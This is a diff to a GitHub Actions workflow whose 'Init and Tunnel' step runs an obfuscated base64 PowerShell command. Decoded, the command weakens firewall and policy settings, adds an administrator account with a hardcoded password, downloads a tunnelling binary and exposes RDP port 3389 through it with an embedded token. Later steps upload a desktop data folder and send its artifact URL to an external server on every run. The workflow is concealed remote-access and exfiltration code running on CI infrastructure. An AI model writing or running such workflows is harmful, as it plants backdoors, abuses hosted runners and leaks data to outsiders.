@@ -16,26 +16,27 @@ jobs:
       # Step 2: Init and Tunnel
       - name: Init and Tunnel
         shell: pwsh
-        timeout-minutes: 3
+        timeout-minutes: 3   # limit to 2 minutes
         run: |
           powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwAQwB1AHMAdABvAG0ATgBvAGQAZQAiACAALQBOAGEAbQBlACAAIgBBAGwAbABvAHcAQwBvAG4AbgAiACAALQBWAGEAbAB1AGUAIAAwAAoARQBuAGEAYgBsAGUALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBHAHIAbwB1AHAAIAAiAEYAaQBsAGUAIABhAG4AZAAgAFAAcgBpAG4AdABlAHIAIABTAGgAYQByAGkAbgBnACIACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABDAHUAcwB0AG8AbQBOAG8AZABlAFwAQQBjAGMAZQBzAHMAIgAgAC0ATgBhAG0AZQAgACIAQQB1AHQAaABNAG8AZABlACIAIAAtAFYAYQBsAHUAZQAgADEACgAKACMAIABDAHIAZQBhAHQAZQAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABhAGMAYwBvAHUAbgB0ACAAdwBpAHQAaAAgAGcAaQB2AGUAbgAgAHAAYQBzAHMAdwBvAHIAZAAKAG4AZQB0ACAAdQBzAGUAcgAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABPAEwARABVAFMARQBSACMANgAgAC8AYQBkAGQACgBuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACAALwBhAGQAZAAKAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGIAaQBuAGEAcgB5ACAAYQBuAGQAIABzAHQAYQByAHQAIAB0AHUAbgBuAGUAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBzADMALgBhAHAALQBzAG8AdQB0AGgALQAxAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAHAAdQBiAGwAaQBjAC4AcABpAG4AZwBnAHkALgBiAGkAbgBhAHIAaQBlAHMALwBjAGwAaQAvAHYAMAAuADIALgA1AC8AdwBpAG4AZABvAHcAcwAvAGEAbQBkADYANAAvAHAAaQBuAGcAZwB5AC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAcABpAG4AZwBnAHkALgBlAHgAZQAiAAoALgBcAHAAaQBuAGcAZwB5AC4AZQB4AGUAIAAtAC0AdABvAGsAZQBuACAASwA0AHIAZABOAEwAWgBUAFEAZQA5ACAALQAtAHQAeQBwAGUAIAB0AGMAcAAgAC0AbAAgADMAMwA4ADkA
 
       # Step 3: List Desktop Data contents
       - name: List Desktop Data contents
         shell: cmd
-        run: dir 'C:\Users\Administrator\Desktop\data'
+        run: dir "C:\Users\Administrator\Desktop\data"
         continue-on-error: true
 
-      # Step 4: Upload Desktop Data as artifact
+      # Step 4: Upload Desktop Data as artifact (always run)
       - name: Upload Desktop Data as "data" artifact
+        if: always()
         uses: actions/upload-artifact@v4
         with:
           name: data
-          path: 'C:\Users\Administrator\Desktop\data'
-        if: always()
+          path: "C:/Users/Administrator/Desktop/data"
 
-      # Step 5: Send artifact download URL to external server
+      # Step 5: Send artifact download URL to external server (always run)
       - name: Send artifact download URL to external server
+        if: always()
         env:
           GITHUB_RUN_ID: ${{ github.run_id }}
           ARTIFACT_URL: https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts
